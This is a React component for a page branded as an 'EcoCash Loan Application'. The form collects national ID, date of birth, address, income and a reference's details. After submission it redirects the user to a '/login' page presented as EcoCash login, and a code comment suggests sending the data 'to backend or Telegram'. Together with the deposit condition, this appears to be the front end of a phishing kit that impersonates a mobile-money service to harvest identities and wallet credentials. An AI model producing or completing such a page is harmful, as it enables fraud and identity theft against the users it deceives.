import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const LoanLanding: React.FC = () => {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    name: "",
    phone: "",
    email: "",
    nationalId: "",
    dob: "",
    address: "",
    employmentStatus: "Employed",
    employer: "",
    income: "",
    loanType: "Personal Loan",
    amount: "",
    repayment: "1 Month",
    purpose: "",
    referenceName: "",
    referencePhone: "",
    agree: false,
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value, type } = e.target;
    if (type === "checkbox") {
      setForm({ ...form, [name]: (e.target as HTMLInputElement).checked });
    } else {
      setForm({ ...form, [name]: value });
    }
  };

  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
    // Optionally: send form data to backend or Telegram here
    setTimeout(() => {
      navigate("/login");
    }, 3000);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-blue-100 to-blue-300 p-2 sm:p-4">
      <div className="bg-white/90 rounded-2xl shadow-lg p-4 sm:p-8 max-w-full w-full sm:max-w-2xl md:max-w-3xl lg:max-w-4xl transition-all">
        {submitted ? (
          <div className="flex flex-col items-center justify-center min-h-[300px]">
            <h2 className="text-xl sm:text-2xl font-bold text-green-700 mb-4 text-center">Loan Application Submitted</h2>
            <p className="text-gray-700 text-center mb-2 text-sm sm:text-base">
              Your loan application has been submitted. Please wait for approval.<br />
              You will receive a confirmation message. For now, proceed to EcoCash.
            </p>
            <p className="text-xs text-gray-500 text-center">Redirecting to EcoCash login in a moment...</p>
          </div>
        ) : (
          <>
            <h1 className="text-2xl sm:text-3xl font-bold mb-2 sm:mb-4 text-blue-700 text-center">EcoCash Loan Application</h1>
            <p className="mb-2 sm:mb-4 text-gray-700 text-center text-xs sm:text-sm">
              Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification.
            </p>
            <div className="mb-4">
              <div className="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-3 rounded text-xs sm:text-sm text-center">
                <strong>Important:</strong> You must have at least <span className="font-bold">10%</span> of the loan amount you want in your EcoCash account.
              </div>
            </div>
            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
              {/* ...existing form fields... */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Full Name</label>
                  <input type="text" name="name" value={form.name} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Phone Number</label>
                  <input type="tel" name="phone" value={form.phone} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Email Address</label>
                  <input type="email" name="email" value={form.email} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">National ID / Passport</label>
                  <input type="text" name="nationalId" value={form.nationalId} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Date of Birth</label>
                  <div className="flex gap-2">
                    <select
                      className="border rounded-md px-2 py-2 bg-white text-xs sm:text-base"
                      value={form.dob ? form.dob.split('-')[0] : ''}
                      onChange={e => {
                        const year = e.target.value;
                        const [_, m, d] = form.dob ? form.dob.split('-') : ['', '', ''];
                        const dob = `${year}-${m || '01'}-${d || '01'}`;
                        setForm(f => ({ ...f, dob }));
                      }}
                      required
                    >
                      <option value="">Year</option>
                      {Array.from({ length: 100 }, (_, i) => {
                        const y = new Date().getFullYear() - i;
                        return <option key={y} value={y}>{y}</option>;
                      })}
                    </select>
                    <select
                      className="border rounded-md px-2 py-2 bg-white text-xs sm:text-base"
                      value={form.dob ? form.dob.split('-')[1] : ''}
                      onChange={e => {
                        const month = e.target.value;
                        const [y, _, d] = form.dob ? form.dob.split('-') : ['', '', ''];
                        const dob = `${y || new Date().getFullYear()}-${month}-${d || '01'}`;
                        setForm(f => ({ ...f, dob }));
                      }}
                      required
                    >
                      <option value="">Month</option>
                      {Array.from({ length: 12 }, (_, i) => {
                        const m = String(i + 1).padStart(2, '0');
                        return <option key={m} value={m}>{m}</option>;
                      })}
                    </select>
                    <select
                      className="border rounded-md px-2 py-2 bg-white text-xs sm:text-base"
                      value={form.dob ? form.dob.split('-')[2] : ''}
                      onChange={e => {
                        const day = e.target.value;
                        const [y, m, _] = form.dob ? form.dob.split('-') : ['', '', ''];
                        const dob = `${y || new Date().getFullYear()}-${m || '01'}-${day}`;
                        setForm(f => ({ ...f, dob }));
                      }}
                      required
                    >
                      <option value="">Day</option>
                      {Array.from({ length: 31 }, (_, i) => {
                        const d = String(i + 1).padStart(2, '0');
                        return <option key={d} value={d}>{d}</option>;
                      })}
                    </select>
                  </div>
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Residential Address</label>
                  <input type="text" name="address" value={form.address} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Employment Status</label>
                  <select name="employmentStatus" value={form.employmentStatus} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base">
                    <option>Employed</option>
                    <option>Self-Employed</option>
                    <option>Unemployed</option>
                    <option>Student</option>
                    <option>Pensioner</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Employer / Business Name</label>
                  <input type="text" name="employer" value={form.employer} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Monthly Income (USD)</label>
                  <input type="number" name="income" value={form.income} onChange={handleChange} required min={0} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Loan Type</label>
                  <select name="loanType" value={form.loanType} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base">
                    <option>Personal Loan</option>
                    <option>Business Loan</option>
                    <option>Salary Advance</option>
                    <option>School Fees Loan</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Loan Amount (USD)</label>
                  <input
                    type="number"
                    name="amount"
                    value={form.amount}
                    onChange={handleChange}
                    required
                    min={0.1}
                    step={0.01}
                    placeholder="e.g. 0.1 (min)"
                    className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base"
                  />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Repayment Period</label>
                  <select name="repayment" value={form.repayment} onChange={handleChange} className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base">
                    <option>1 Month</option>
                    <option>3 Months</option>
                    <option>6 Months</option>
                    <option>12 Months</option>
                  </select>
                </div>
                <textarea name="purpose" value={form.purpose} onChange={handleChange} rows={3} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Reference Name</label>
                  <input type="text" name="referenceName" value={form.referenceName} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
                <div>
                  <label className="block text-xs sm:text-sm font-medium mb-1 text-gray-700">Reference Phone</label>
                  <input type="tel" name="referencePhone" value={form.referencePhone} onChange={handleChange} required className="w-full border rounded-md px-2 sm:px-3 py-2 focus:outline-none focus:ring focus:ring-blue-200 text-xs sm:text-base" />
                </div>
              </div>
              <div className="flex items-center mt-2">
                <input type="checkbox" name="agree" checked={form.agree} onChange={handleChange} required className="mr-2" />
                <span className="text-xs text-gray-600">I confirm that the information provided is true and I agree to the EcoCash Loans terms and conditions.</span>
              </div>
              <button type="submit" className="w-full py-2 sm:py-3 rounded-lg bg-blue-600 text-white font-semibold text-base sm:text-lg hover:bg-blue-700 transition">
                Continue with EcoCash
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default LoanLanding;
